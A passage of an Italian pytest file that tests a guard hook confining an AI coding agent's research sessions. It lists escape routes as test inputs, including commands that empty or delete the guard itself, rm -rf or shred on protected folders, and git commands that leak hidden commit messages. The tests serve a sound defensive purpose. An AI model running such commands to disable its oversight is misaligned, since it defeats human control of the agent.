    assert _bash(gruppo_nuovo, "ls research/data/insample/*")[0] == 0
    _scrivi(gruppo_nuovo, f"research/data/insample/{intrusa}/x.zip", "x\n")
    _rifiutato(_bash(gruppo_nuovo, "ls research/data/insample/*"))
    if intrusa == "ETHUSDT":
        _rifiutato(_bash(gruppo_nuovo, "cat research/data/insample/E*/x.zip"))


# ---------------------------------------------------------------------------
# H. git in un repo vero, sul branch research/campagna/GRUPPO
# ---------------------------------------------------------------------------


def _ambiente_git(casa: Path) -> dict:
    """Ambiente per il git dei test: niente configurazione dell'utente, autore fisso."""
    ambiente = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    ambiente.update(
        HOME=str(casa),
        GIT_CONFIG_NOSYSTEM="1",
        GIT_AUTHOR_NAME="Prova",
        GIT_AUTHOR_EMAIL="prova@example.com",
        GIT_COMMITTER_NAME="Prova",
        GIT_COMMITTER_EMAIL="prova@example.com",
    )
    return ambiente


def _git(radice: Path, *argomenti: str) -> str:
    esito = subprocess.run(
        ["git", "-c", "commit.gpgsign=false", *argomenti],
        cwd=str(radice), env=_ambiente_git(radice.parent), capture_output=True, text=True, timeout=60,
    )
    assert esito.returncode == 0, esito.stderr
    return esito.stdout.strip()


def _commit(radice: Path, messaggio: str) -> None:
    _git(radice, "add", ".")
    _git(radice, "commit", "-q", "-m", messaggio)


def _bash_vero_esito(radice: Path, comando: str) -> tuple[int, str]:
    """Esegue DAVVERO il comando in bash nel repo di prova: (exit code, stdout+stderr)."""
    esito = subprocess.run(
        ["bash", "-c", comando], cwd=str(radice), env=_ambiente_git(radice.parent),
        capture_output=True, text=True, timeout=60,
    )
    return esito.returncode, esito.stdout + esito.stderr


def _bash_vero(radice: Path, comando: str) -> str:
    return _bash_vero_esito(radice, comando)[1]


def _marcatore_gruppo(radice: Path) -> None:
    _scrivi(radice, "research/.sessione", json.dumps({"tipo": "campagna", "simbolo": "GRUPPO"}))


def _costruisci_origine(base: Path) -> Path:
    """Un remoto nudo `origine.git` con: `main` (tre commit, il secondo porta l'elenco
    vero e le schede del gruppo, il terzo e' del coordinamento e non tocca la
    cartella del gruppo), l'archivio `research/archivio/campagna/GRUPPO` e il
    branch `research/campagna/GRUPPO` con un commit suo. Restituisce il remoto."""
    base.mkdir(parents=True)
    _git(base, "init", "-q", "--bare", "-b", "main", "origine.git")
    coordinamento = base / "coordinamento"
    coordinamento.mkdir()
    _git(coordinamento, "init", "-q", "-b", "main")
    _scrivi(coordinamento, ".gitignore", "research/.sessione\nresearch/data/\n")
    _scrivi(coordinamento, "research/config/percorsi_vietati.txt", VIETATI_REPO.read_text(encoding="utf-8"))
    _scrivi(coordinamento, "research/src/motore.py", "# motore\n")
    _scrivi(coordinamento, "docs/state.md", "stato\n")
    for moneta in CAMPAGNA:
        _scrivi(coordinamento, f"research/campagne/{moneta}/scheda_moneta.md", f"scheda {moneta}\n")
    _commit(coordinamento, f"C1 {MSG_DIARIO_1}: protocollo e schede")
    (coordinamento / g.MONETE_GRUPPO).parent.mkdir(parents=True)
    shutil.copy(MONETE_REPO, coordinamento / g.MONETE_GRUPPO)
    for moneta in MONETE:
        _scrivi(coordinamento, f"research/campagne/GRUPPO/schede/{moneta}.md", f"scheda {moneta}\n")
    _scrivi(coordinamento, "research/campagne/GRUPPO/regole.md", "regole\n")
    _commit(coordinamento, "C2 campagna di gruppo: elenco e schede delle monete")
    _scrivi(coordinamento, "docs/diario.md", "diario\n")
    _commit(coordinamento, f"C3 {MSG_DIARIO_2}: coordinamento, cita research/campagne/GRUPPO/")
    _git(coordinamento, "remote", "add", "origin", str(base / "origine.git"))
    _git(coordinamento, "push", "-q", "origin", "main")
    _git(coordinamento, "checkout", "-q", "-b", "research/archivio/campagna/GRUPPO")
    _scrivi(coordinamento, "research/campagne/GRUPPO/log.jsonl", f"{CONTENUTO_ARCHIVIO}\n")
    _commit(coordinamento, f"{MSG_ARCHIVIO}: archivio")
    _git(coordinamento, "push", "-q", "origin", "HEAD")
    _git(coordinamento, "checkout", "-q", "main")
    _git(coordinamento, "checkout", "-q", "-b", PROPRIO)
    _scrivi(coordinamento, "research/campagne/GRUPPO/log.jsonl", '{"evento": "inizio"}\n')
    _commit(coordinamento, "campagna: inizio")
    _git(coordinamento, "push", "-q", "origin", "HEAD")
    return base / "origine.git"


def _dati_della_sessione(sessione: Path) -> None:
    """I dati in-sample (fuori da git) di qualche moneta, come dopo la Fase 0."""
    for moneta in ("AAVEUSDT", "ZRXUSDT", "BTCUSDT"):
        _scrivi(sessione, f"research/data/insample/{moneta}/x.zip", "dati\n")


def _sessione_completa(base: Path) -> Path:
    """La sessione di gruppo che apre il proprio branch come dice la sezione 9 del
    protocollo, in un clone con la storia COMPLETA: scarica `main`, poi
    `git fetch origin <proprio>`, `checkout -b` (ancora senza marcatore), marcatore."""
    origine = _costruisci_origine(base)
    sessione = base / "sessione"
    sessione.mkdir()
    _git(sessione, "init", "-q", "-b", "main")
    _git(sessione, "remote", "add", "origin", str(origine))
    _git(sessione, "fetch", "-q", "origin", "main")
    _git(sessione, "reset", "-q", "--hard", "origin/main")
    _git(sessione, "fetch", "-q", "origin", PROPRIO)
    # senza marcatore il guardiano non interviene: il checkout della sezione 9 passa
    assert _bash(sessione, f"git checkout -q -b {PROPRIO} origin/{PROPRIO}")[0] == 0
    _git(sessione, "checkout", "-q", "-b", PROPRIO, f"origin/{PROPRIO}")
    assert _git(sessione, "branch", "--show-current") == PROPRIO
    _dati_della_sessione(sessione)
    _marcatore_gruppo(sessione)
    return sessione


def _sessione_limitata(base: Path) -> Path:
    """La stessa sessione, ma in un clone a storia limitata (`--depth 2`): il commit
    di confine e' C3, del coordinamento, che non tocca la cartella del gruppo."""
    origine = _costruisci_origine(base)
    sessione = base / "limitata"
    _git(base, "clone", "-q", "--depth", "2", "--branch", PROPRIO, f"file://{origine}", str(sessione))
    assert _git(sessione, "rev-parse", "--is-shallow-repository") == "true"
    assert _git(sessione, "branch", "--show-current") == PROPRIO
    _dati_della_sessione(sessione)
    _marcatore_gruppo(sessione)
    return sessione


@pytest.fixture(scope="module")
def completa_condivisa(tmp_path_factory) -> Path:
    return _sessione_completa(tmp_path_factory.mktemp("gruppo_completa") / "base")


@pytest.fixture
def completa(tmp_path: Path) -> Path:
    return _sessione_completa(tmp_path / "base")


@pytest.fixture(scope="module")
def limitata(tmp_path_factory) -> Path:
    return _sessione_limitata(tmp_path_factory.mktemp("gruppo_limitata") / "base")


def test_H_passi_della_sezione_9_e_lavoro_sul_proprio_branch(completa: Path):
    """Ammessi dal guardiano ed eseguiti davvero senza errori."""
    _scrivi(completa, "research/campagne/GRUPPO/ipotesi.md", "ipotesi\n")
    # il messaggio di commit in un file fuori da git, come dice lezioni/metodo.md
    _scrivi(completa, "research/data/insample/BTCUSDT/messaggio.txt", "ipotesi del gruppo\n")
    for comando in (
        f"git fetch origin {PROPRIO}",
        f"git log --reverse --format=%cI origin/{PROPRIO} -- research/campagne/GRUPPO/log.jsonl",
        "git status",
        "git add research/campagne/GRUPPO/ipotesi.md",
        "git commit -q -F research/data/insample/BTCUSDT/messaggio.txt",
        f"git push -u origin {PROPRIO}",
        f"git pull origin {PROPRIO}",
        "git log --format=%B -- research/campagne/GRUPPO/",
        "git log -- research/campagne/GRUPPO/",
    ):
        codice, errore = _bash(completa, comando)
        assert codice == 0, f"{comando}: {errore}"
        codice, uscita = _bash_vero_esito(completa, comando)
        assert codice == 0, f"{comando}: {uscita}"
        for riservato in RISERVATI:
            assert riservato not in uscita, f"{comando!r} stampa {riservato}"


def test_H_con_la_storia_completa_il_log_della_propria_cartella_e_quello_di_prima(completa_condivisa: Path):
    """Senza clone limitato nulla cambia: il formato predefinito resta ammesso, e
    stampa solo i commit che toccano la cartella del gruppo."""
    assert g._clone_limitato(str(completa_condivisa)) is False
    uscita = _bash_vero(completa_condivisa, "git log -- research/campagne/GRUPPO/")
    assert "C2 campagna di gruppo" in uscita and "campagna: inizio" in uscita
    for comando in ("git log -- research/campagne/GRUPPO/", "git log --oneline -- research/campagne/GRUPPO/",
                    "git blame --porcelain research/campagne/GRUPPO/monete.csv"):
        codice, errore = _bash(completa_condivisa, comando)
        assert codice == 0, errore


@pytest.mark.parametrize(
    "comando",
    [
        "git fetch origin research/campagna/BTCUSDT",
        "git fetch origin research/archivio/campagna/GRUPPO",
        "git fetch origin research/coordinamento",
        "git fetch origin",
        "git push origin HEAD:research/campagna/BTCUSDT",
        "git push origin HEAD:main",
        "git log --format=%h -- research/campagne/BTCUSDT/",
        "git log --format=%h -- research/data/insample/AAVEUSDT/",
        "git log --format=%h -- research/campagne/",
        "git log --format=%h origin/research/archivio/campagna/GRUPPO -- research/campagne/GRUPPO/",
        "git show HEAD:research/campagne/ETHUSDT/scheda_moneta.md",
        "git show HEAD:research/campagne/BTCUSDT/scheda_moneta.md",
        "git show HEAD:docs/diario.md",
        "git ls-files -- research/campagne/",
        "git ls-files",
        "git checkout main",
        "git diff main -- research/campagne/GRUPPO/",
    ],
)
def test_H_git_fuori_dal_proprio_branch_o_dalla_propria_cartella(completa_condivisa: Path, comando: str):
    _rifiutato(_bash(completa_condivisa, comando))


def test_H_commit_e_push_con_head_sul_principale(completa: Path):
    (completa / "research" / ".sessione").unlink()
    _git(completa, "checkout", "-q", "main")
    _marcatore_gruppo(completa)
    for comando in ("git commit -q -m x", "git push origin HEAD", f"git push origin {PROPRIO}"):
        _rifiutato(_bash(completa, comando))


# ---------------------------------------------------------------------------
# storia nei cloni a storia limitata (vale per ogni campagna)
# ---------------------------------------------------------------------------


def test_storia_limitata_il_repo_di_prova_ha_il_buco(limitata: Path):
    """Nel clone `--depth 2` il commit di confine (C3, del coordinamento) sembra
    aggiungere tutti i file, e `git log -- <cartella del gruppo>` ne stampa il messaggio."""
    assert g._clone_limitato(str(limitata)) is True
    assert MSG_DIARIO_2 in _bash_vero(limitata, "git log -- research/campagne/GRUPPO/")
    assert MSG_DIARIO_2 not in _bash_vero(limitata, "git log -- research/campagne/GRUPPO/log.jsonl")


@pytest.mark.parametrize(
    "comando",
    [
        "git log -- research/campagne/GRUPPO/",
        "git log --oneline -- research/campagne/GRUPPO/",
        "git log -3 -- research/campagne/GRUPPO/",
        "git log --stat -- research/campagne/GRUPPO/",
        "git log --format=%s -- research/campagne/GRUPPO/",
        "git log --format=%B -- research/campagne/GRUPPO/",
        "git log --format=%h%x20%s -- research/campagne/GRUPPO/",
        "git log --format=%h%n%B -- research/campagne/GRUPPO/",
        "git log --format=%h%+s -- research/campagne/GRUPPO/",
        "git log --pretty=format:%h%x09%s -- research/campagne/GRUPPO/",
        "git log --format=tformat:%B -- research/campagne/GRUPPO/",
        "git log --pretty=oneline -- research/campagne/GRUPPO/",
        "git log --pretty=o -- research/campagne/GRUPPO/",
        "git log --format=reference -- research/campagne/GRUPPO/",
        "git log --pretty=raw -- research/campagne/GRUPPO/",
        "git log --pretty -- research/campagne/GRUPPO/",
        "git log --format=%h --oneline -- research/campagne/GRUPPO/",
        # un'opzione con valore separato ingoia il formato: git usa quello predefinito
        "git log --until --format=%h -- research/campagne/GRUPPO/",
        "git log --grep --format=%h --invert-grep -- research/campagne/GRUPPO/",
        "git shortlog HEAD -- research/campagne/GRUPPO/",
        "git shortlog --group=format:%s --format=%h HEAD -- research/campagne/GRUPPO/",
        "git rev-list --header HEAD -- research/campagne/GRUPPO/",
        "git rev-list --oneline HEAD -- research/campagne/GRUPPO/",
        "git rev-list --format=%B HEAD -- research/campagne/GRUPPO/",
        "git rev-list --pretty HEAD -- research/campagne/GRUPPO/",
        "git blame --porcelain research/campagne/GRUPPO/monete.csv",
        "git blame -p research/campagne/GRUPPO/monete.csv",
        "git blame --line-porcelain research/campagne/GRUPPO/monete.csv",
        "git blame --incremental research/campagne/GRUPPO/monete.csv",
        "git blame --porc research/campagne/GRUPPO/monete.csv",
        "git annotate -p research/campagne/GRUPPO/monete.csv",
    ],
)
def test_storia_limitata_messaggi_rifiutati(limitata: Path, comando: str):
    """Prima la prova che il comando stampa davvero il messaggio del commit di confine."""
    assert MSG_DIARIO_2 in _bash_vero(limitata, comando), "il comando non stampa il riservato: non e' un buco"
    codice, errore = _bash(limitata, comando)
    assert codice == 2, f"BUCO: il guardiano consente {comando!r}"
    assert errore.startswith(RIFIUTO) and GRUPPO in errore and "shallow" in errore, errore


@pytest.mark.parametrize(
    "comando",
    [
        # stampano il messaggio solo in parte, o fanno del confine un oracolo, o non si provano in bash
        "git log --format=%b -- research/campagne/GRUPPO/",
        "git log --format=%h%d -- research/campagne/GRUPPO/",
        "git log --format=%h%an -- research/campagne/GRUPPO/",
        "git log --format=%h% -- research/campagne/GRUPPO/",
        "git log --format= -- research/campagne/GRUPPO/",
        "git log --format -- research/campagne/GRUPPO/",
        "git log --grep=DIARIO --format=%h -- research/campagne/GRUPPO/",
        "git log --author=Prova --format=%h -- research/campagne/GRUPPO/",
        "git log --log-size --format=%h -- research/campagne/GRUPPO/",
        "git log -n --format=%h -- research/campagne/GRUPPO/",
        "git log --line-prefix --format=%h -- research/campagne/GRUPPO/",
        "git shortlog -s HEAD -- research/campagne/GRUPPO/",
        "git shortlog --group=trailer:x --format=%h HEAD -- research/campagne/GRUPPO/",
        "git shortlog --gro=format:%s --format=%h HEAD -- research/campagne/GRUPPO/",
        "git whatchanged -- research/campagne/GRUPPO/",
        "git whatchanged --format=%s -- research/campagne/GRUPPO/",
    ],
)
def test_storia_limitata_altri_rifiuti(limitata: Path, comando: str):
    codice, errore = _bash(limitata, comando)
    assert codice == 2, f"il guardiano consente {comando!r}"
    assert GRUPPO in errore and "shallow" in errore, errore


@pytest.mark.parametrize(
    "comando",
    [
        # il comando della sezione 9 del protocollo
        f"git log --reverse --format=%cI origin/{PROPRIO} -- research/campagne/GRUPPO/log.jsonl",
        "git log --format=%cI -- research/campagne/GRUPPO/",
        "git log --format=%h%x20%cI -- research/campagne/GRUPPO/",
        "git log --format='%h %cI' --stat -- research/campagne/GRUPPO/",
        "git log --format='%H %ad %ct %at %aI %cd' --date=iso -- research/campagne/GRUPPO/",
        "git log --pretty=format:%H --name-only -- research/campagne/GRUPPO/",
        "git log --format=tformat:%h%n%cI%x09%%. --name-status -- research/campagne/GRUPPO/",
        "git log -3 --reverse --format=%ct -- research/campagne/GRUPPO/",
        "git log --max-count=1 --format=%h HEAD -- research/campagne/GRUPPO/log.jsonl",
        "git rev-list HEAD -- research/campagne/GRUPPO/",
        "git rev-list --count HEAD -- research/campagne/GRUPPO/",
        "git rev-list --format=%h HEAD -- research/campagne/GRUPPO/",
        "git shortlog -s --format=%h HEAD -- research/campagne/GRUPPO/",
        "git shortlog --group=author --format=%cI HEAD -- research/campagne/GRUPPO/",
        "git blame research/campagne/GRUPPO/monete.csv",
        "git blame -s research/campagne/GRUPPO/regole.md",
        "git annotate research/campagne/GRUPPO/regole.md",
    ],
)
def test_storia_limitata_date_e_hash_ammessi(limitata: Path, comando: str):
    codice, uscita = _bash_vero_esito(limitata, comando)
    assert codice == 0 and "fatal" not in uscita, uscita
    for riservato in RISERVATI:
        assert riservato not in uscita, f"{comando!r} stampa {riservato}"
    codice, errore = _bash(limitata, comando)
    assert codice == 0, errore


def test_storia_limitata_se_git_non_sa_dirlo_vale_come_limitata(tmp_path: Path):
    """Una radice che non e' un repo: git non risponde, quindi prudenza. Per ogni
    campagna, non solo per il gruppo."""
    for simbolo, cartella in (("GRUPPO", "research/campagne/GRUPPO/"), ("BTCUSDT", "research/campagne/BTCUSDT/")):
        radice = _radice_gruppo(tmp_path / simbolo, {"tipo": "campagna", "simbolo": simbolo})
        assert g._clone_limitato(str(radice)) is True
        codice, errore = _bash(radice, f"git log -- {cartella}")
        assert codice == 2 and "shallow" in errore and f"sessione campagna {simbolo}" in errore, errore
        codice, errore = _bash(radice, f"git log --format=%h%x20%cI -- {cartella}")
        assert codice == 0, errore


def test_storia_limitata_il_formato_si_giudica_per_segnaposto():
    for buono in ("%cI", "%h %cI", "format:%H", "tformat:%h%n", "%ad|%aI|%ct|%at|%cd|%H", "%h%x00%%", "x%hx"):
        assert g._formato_solo_date_e_hash(buono), buono
    for cattivo in ("oneline", "o", "medium", "reference", "raw", "", "%s", "%b", "%B", "%N", "%d", "%an",
                    "%ae", "%h%", "%+s", "% s", "%<(5)%s", "%C(red)", "%(trailers)", "%G?", "format:%s"):
        assert not g._formato_solo_date_e_hash(cattivo), cattivo


# ---------------------------------------------------------------------------
# I. per le altre sessioni non cambia niente
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("simbolo", ["BTCUSDT", "ETHUSDT"])
def test_I_campagna_di_una_moneta_come_prima(tmp_path: Path, simbolo: str):
    radice = _radice_gruppo(tmp_path / "repo", {"tipo": "campagna", "simbolo": simbolo})
    _scrivi(radice, f"research/data/insample/{simbolo}/x.zip", "dati\n")
    etichetta = f"sessione campagna {simbolo}"
    _rifiutato(_read(radice, "research/data/insample/AAVEUSDT/x.zip"), etichetta)
    _rifiutato(_read(radice, "research/campagne/GRUPPO/ipotesi.md"), etichetta)
    _rifiutato(_read(radice, "research/campagne/GRUPPO/monete.csv"), etichetta)
    _rifiutato(_read(radice, "research/data/insample/GRUPPO/x.zip"), etichetta)
    _rifiutato(_bash(radice, "ls research/data/insample"), etichetta)
    for percorso in (f"research/data/insample/{simbolo}/x.zip", "research/data/insample/BTCUSDT/x.zip",
                     f"research/campagne/{simbolo}/scheda_moneta.md"):
        assert _read(radice, percorso)[0] == 0, percorso
    codice, errore = _read(radice, "research/campagne/LTCUSDT/scheda_moneta.md")
    assert codice == 2 and "(Passo 3)" in errore and "4bis" not in errore, errore
    # un elenco del gruppo manomesso o assente non li riguarda
    _con_eth(radice)
    assert _read(radice, f"research/data/insample/{simbolo}/x.zip")[0] == 0
    (radice / g.MONETE_GRUPPO).unlink()
    assert _read(radice, f"research/data/insample/{simbolo}/x.zip")[0] == 0


def _ammesso_prima(rel: str, simbolo: str) -> bool:
    """La lista bianca com'era prima del 10 ottobre 2026 (cartelle fisse dei dati)."""
    cartelle = ("research/config", "research/src", f"research/campagne/{simbolo}",
                f"research/data/insample/{simbolo}", "research/data/insample/BTCUSDT", ".claude")
    return rel in g._CAMPAGNA_FILE or any(rel == c or rel.startswith(c + "/") for c in cartelle)


@pytest.mark.parametrize("simbolo", ["BTCUSDT", "ETHUSDT", "SOLUSDT", "1000SHIBUSDT"])
def test_I_lista_bianca_di_una_moneta_identica_a_prima(simbolo: str):
    percorsi = [
        "research/data/insample", "research/data", "research", ".",
        "research/data/insample/BTCUSDT", "research/data/insample/BTCUSDT/1h/x.zip",
        f"research/data/insample/{simbolo}", f"research/data/insample/{simbolo}/x.zip",
        f"research/data/insample/{simbolo}X/x.zip", f"research/data/insample/{simbolo[:-1]}/x.zip",
        f"research/data/insample/{simbolo.lower()}/x.zip", "research/data/insample/BTCUSDTX/x",
        "research/data/insample/AAVEUSDT/x.zip", "research/data/insample/ETHUSDT/x.zip",
        "research/data/insample/GRUPPO/x.zip", "research/data/vault/BTCUSDT/x.zip",
        f"research/data/vault/{simbolo}/x.zip", "research/data/placebo/data/insample/BTCUSDT/x.zip",
        f"research/campagne/{simbolo}/log.jsonl", "research/campagne/GRUPPO/monete.csv",
        "research/campagne/BTCUSDT/scheda_moneta.md", "research/campagne/ETHUSDT/scheda_moneta.md",
        "research/src/motore.py", "research/config/parametri.yaml", "research/PROTOCOLLO.md",
        "research/lezioni/metodo.md", "research/lezioni/altro.md", ".claude/settings.json", "CLAUDE.md",
        "docs/state.md", "research/universo/x.csv", "research/insample/BTCUSDT/x",
        "research/data/insample/BTCUSDT/../ETHUSDT/x",  # gia' normalizzato altrove: qui conta il testo
    ]
    for rel in percorsi:
        assert g.ammesso_in_campagna(rel, simbolo) == _ammesso_prima(rel, simbolo), rel
        # con un elenco del gruppo passato per sbaglio a una moneta sola, nulla cambia
        assert g.ammesso_in_campagna(rel, simbolo, frozenset(MONETE)) == _ammesso_prima(rel, simbolo), rel


def test_I_coordinamento_legge_e_scrive_l_elenco_e_il_vault_resta_chiuso(tmp_path: Path):
    radice = _radice_gruppo(tmp_path / "repo", {"tipo": "coordinamento"})
    _con_eth(radice)  # nemmeno un elenco manomesso ferma il coordinamento
    for percorso in ("research/campagne/GRUPPO/monete.csv", "research/campagne/GRUPPO/schede/AAVEUSDT.md"):
        assert _read(radice, percorso)[0] == 0
        assert _write(radice, percorso)[0] == 0
    assert _read(radice, "research/data/insample/ETHUSDT/x.zip")[0] == 0
    _rifiutato(_read(radice, "research/data/vault/AAVEUSDT/x.zip"), "sessione coordinamento")


@pytest.mark.parametrize(
    "marcatore, letture_attese",
    [
        (None, 0),
        ({"tipo": "coordinamento"}, 0),
        ({"tipo": "campagna", "simbolo": "BTCUSDT"}, 0),
        ({"tipo": "campagna", "simbolo": "GRUPPO"}, 1),
    ],
)
def test_I_l_elenco_si_legge_solo_con_il_marcatore_gruppo(tmp_path: Path, monkeypatch, marcatore,
                                                          letture_attese: int):
    radice = _radice_gruppo(tmp_path / "repo", marcatore if marcatore is not None else False)
    letture = []
    vera = g.leggi_monete_gruppo
    monkeypatch.setattr(g, "leggi_monete_gruppo", lambda *a, **k: letture.append(a) or vera(*a, **k))
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(radice))
    carico = json.dumps({"tool_name": "Read", "tool_input": {"file_path": "research/src/motore.py"},
                         "cwd": str(radice)})
    monkeypatch.setattr(g.sys, "stdin", __import__("io").StringIO(carico))
    assert g.main() == 0
    assert len(letture) == letture_attese


@pytest.mark.parametrize("marcatore", [
    {"tipo": "campagna", "simbolo": "gruppo"},
    {"tipo": "campagna", "simbolo": "Gruppo"},
    {"tipo": "campagna", "simbolo": "GRUPPO/../ETHUSDT"},
])
def test_I_marcatore_gruppo_scritto_male_e_rotto(tmp_path: Path, marcatore):
    radice = _radice_gruppo(tmp_path / "repo", marcatore)
    codice, errore = _read(radice, "research/src/motore.py")
    assert codice == 2 and "marcatore research/.sessione e' rotto" in errore, errore


# ---------------------------------------------------------------------------
# J. fughe trovate dalla revisione del 10 ottobre 2026
#    (cd + nome nudo; cancellare la cartella madre di un protetto; git branch --format)
# ---------------------------------------------------------------------------


# problema bloccante: `cd` in una cartella ammessa e poi una scrittura con un nome
# NUDO (senza '/'). Senza la correzione il nome si giudicava dalla radice, dove non e'
# un percorso, quindi passava: una sessione poteva sovrascrivere QUALSIASI file
# protetto, guardiano compreso (e un guardiano vuoto esce 0 e ammette tutto).
_CD_NUDO_PROTETTO = [
    "cd research/campagne/GRUPPO && echo x > monete.csv",
    "cd research/campagne/GRUPPO && echo x >> monete.csv",
    "cd research/campagne/GRUPPO && rm monete.csv",
    "cd research/campagne/GRUPPO && rm -f monete.csv",
    "cd research/campagne/GRUPPO && tee monete.csv",
    "cd research/campagne/GRUPPO && cp ipotesi.md monete.csv",
    "cd research/campagne/GRUPPO && git rm monete.csv",
    "cd research/campagne/GRUPPO && git rm --cached monete.csv",
    "cd research/campagne/GRUPPO/schede && echo x > AAVEUSDT.md",
    "cd research/campagne/GRUPPO/schede && rm AAVEUSDT.md",
    "cd research/campagne/GRUPPO && echo x > regole.md",
    "cd research/campagne/GRUPPO && echo x > via_libera_validazione.md",
    "cd research/config && echo x > percorsi_vietati.txt",
    "cd research/config && rm percorsi_vietati.txt",
    "cd research/src && cp /dev/null guardiano.py",
    "cd research/src && echo x > guardiano.py",
    "cd research/src && rm guardiano.py",
    "cd research/src && mv guardiano.py altrove.py",
    "cd research && echo x > .sessione",
    "cd .claude && echo x > settings.json",
    "cd .claude && rm settings.json",
    "(cd research/campagne/GRUPPO && echo x > monete.csv)",
    "bash -c 'cd research/campagne/GRUPPO && echo x > monete.csv'",
    "cd research/campagne/GRUPPO/schede && cd .. && echo x > monete.csv",
]


@pytest.mark.parametrize("comando", _CD_NUDO_PROTETTO)
def test_J_cd_in_cartella_ammessa_piu_nome_nudo_su_un_protetto(gruppo_nuovo: Path, comando: str):
    _rifiutato(_bash(gruppo_nuovo, comando))


def test_J_cd_non_svuota_il_guardiano(gruppo_nuovo: Path):
    """La fuga peggiore, end-to-end: il guardiano rifiuta di azzerarsi, resta intero
    e continua a bloccare i dati delle altre monete."""
    prima = (gruppo_nuovo / "research/src/guardiano.py").stat().st_size
    assert _read(gruppo_nuovo, "research/data/insample/ETHUSDT/x.zip")[0] == 2
    _rifiutato(_bash(gruppo_nuovo, "cd research/src && cp /dev/null guardiano.py"))
    _rifiutato(_bash(gruppo_nuovo, "cd research/src && : > guardiano.py"))
    assert (gruppo_nuovo / "research/src/guardiano.py").stat().st_size == prima
    assert _read(gruppo_nuovo, "research/data/insample/ETHUSDT/x.zip")[0] == 2


@pytest.mark.parametrize("comando", [
    "cd research/src && cp /dev/null guardiano.py",
    "cd research/src && echo x > guardiano.py",
    "cd research/src && rm guardiano.py",
    "cd research/config && echo x > percorsi_vietati.txt",
    "cd research && echo x > .sessione",
    "cd .claude && echo x > settings.json",
    "cd .claude && rm settings.json",
])
def test_J_cd_nudo_vale_anche_per_una_campagna_singola(tmp_path: Path, comando: str):
    """Il buco e' comune a ogni campagna, non solo al gruppo."""
    radice = _radice_gruppo(tmp_path / "repo", {"tipo": "campagna", "simbolo": "ETHUSDT"})
    _rifiutato(_bash(radice, comando), "sessione campagna ETHUSDT")


@pytest.mark.parametrize("comando", [
    # dentro una cartella ammessa, un nome nudo che NON e' protetto resta scrivibile
    "cd research/campagne/GRUPPO && echo x > ipotesi.md",
    "cd research/campagne/GRUPPO && echo nota >> ipotesi.md",
    "cd research/campagne/GRUPPO && touch nuovo.md",
    "cd research/campagne/GRUPPO && rm ipotesi.md",
    "cd research/campagne/GRUPPO/codice && echo x > strategia.py",
    "cd research/data/insample/AAVEUSDT && touch nuovo.csv",
    "cd research/data/insample/AAVEUSDT && cp x.zip copia.zip",
    "cd research/campagne/GRUPPO && git add ipotesi.md",
    # e il cd nella radice assoluta non cambia la cartella effettiva
    "cd research/src && cat guardiano.py",
    "cd research/campagne/GRUPPO && cat monete.csv",
]
)
def test_J_cd_nudo_non_blocca_i_file_ammessi(gruppo_nuovo: Path, comando: str):
    codice, errore = _bash(gruppo_nuovo, comando)
    assert codice == 0, errore


def test_J_cd_fuori_posto_rende_ignota_la_cartella(gruppo_nuovo: Path):
    """Dopo un `cd` che non si sa risolvere (verso casa, `cd -`, una variabile), ogni
    percorso relativo si rifiuta: nel dubbio si blocca."""
    _rifiutato(_bash(gruppo_nuovo, "cd && echo x > research/campagne/GRUPPO/ipotesi.md"))
    _rifiutato(_bash(gruppo_nuovo, 'cd "$ALTRO" && echo x > ipotesi.md'))


# problema: cancellare o spostare la cartella MADRE di un file protetto
@pytest.mark.parametrize("comando", [
    "rm -r research/campagne/GRUPPO",
    "rm -rf research/campagne/GRUPPO/",
    "git rm -r -q --cached research/campagne/GRUPPO",
    "git rm -r research/campagne/GRUPPO/schede",
    "find research/campagne/GRUPPO -name '*.md' -delete",
    "find research/campagne/GRUPPO -delete",
    "rm -r research/config",   # contiene percorsi_vietati.txt (stesso schema, preesistente)
    "rm -r research/src",      # contiene guardiano.py
    "rm -r .claude",
    "shred research/campagne/GRUPPO/monete.csv",
])
def test_J_cancellare_la_madre_di_un_protetto_bloccato(gruppo_nuovo: Path, comando: str):
    _rifiutato(_bash(gruppo_nuovo, comando))


@pytest.mark.parametrize("comando", [
    # cancellare una cartella/file che NON contiene protetti resta permesso
    "rm research/campagne/GRUPPO/ipotesi.md",
    "rm -r research/campagne/GRUPPO/codice",
    "git rm research/campagne/GRUPPO/ipotesi.md",
    "find research/campagne/GRUPPO/codice -name '*.py' -delete",
    "rm research/data/insample/AAVEUSDT/x.zip",
])
def test_J_cancellare_cose_non_protette_resta_permesso(gruppo_nuovo: Path, comando: str):
    codice, errore = _bash(gruppo_nuovo, comando)
    assert codice == 0, errore


# problema: git branch --format legge i messaggi dei commit di altri branch locali
@pytest.mark.parametrize("comando", [
    "git branch --format='%(contents)'",
    "git branch --format='%(subject)'",
    "git branch --format='%(contents:subject)'",
    "git branch --format='%(body)'",
    "git branch --format='%(trailers)'",
    "git branch --format='%(describe)'",
    "git branch --pretty='%(subject)'",
    "git branch --format %(subject)",       # valore separato: rifiutato per prudenza
    "git branch --format",                  # senza valore
    "git branch --format='%(refname) %(authorname)'",
])
def test_J_git_branch_format_messaggi_rifiutato(completa_condivisa: Path, comando: str):
    _rifiutato(_bash(completa_condivisa, comando))


def test_J_git_branch_format_messaggio_davvero_leggibile(completa_condivisa: Path):
    """Senza la correzione il comando stampa in bash il messaggio del commit di
    coordinamento su main: la prova che il buco e' reale."""
    uscita = _bash_vero(completa_condivisa, "git branch --format='%(contents:subject)'")
    assert MSG_DIARIO_2 in uscita
    assert _bash(completa_condivisa, "git branch --format='%(contents:subject)'")[0] == 2


@pytest.mark.parametrize("comando", [
    "git branch",
    "git branch --show-current",
    "git branch --format='%(objectname)'",
    "git branch --format='%(refname:short) %(objectname:short)'",
    "git branch --format='%(committerdate:iso) %(authordate:short) %(objectname)'",
])
def test_J_git_branch_hash_date_e_nomi_ammessi(completa_condivisa: Path, comando: str):
    codice, uscita = _bash_vero_esito(completa_condivisa, comando)
    assert codice == 0 and "fatal" not in uscita, uscita
    for riservato in RISERVATI:
        assert riservato not in uscita, f"{comando!r} stampa {riservato}"
    assert _bash(completa_condivisa, comando)[0] == 0


def test_J_formato_branch_si_giudica_per_campo():
    for buono in ("%(objectname)", "%(objectname:short)", "%(refname:short) %(committerdate:iso)",
                  "%(authordate) %(objectname)", "x %(refname) y", ""):
        assert g._formato_branch_sicuro(buono), buono
    for cattivo in ("%(subject)", "%(body)", "%(contents)", "%(contents:subject)", "%(trailers)",
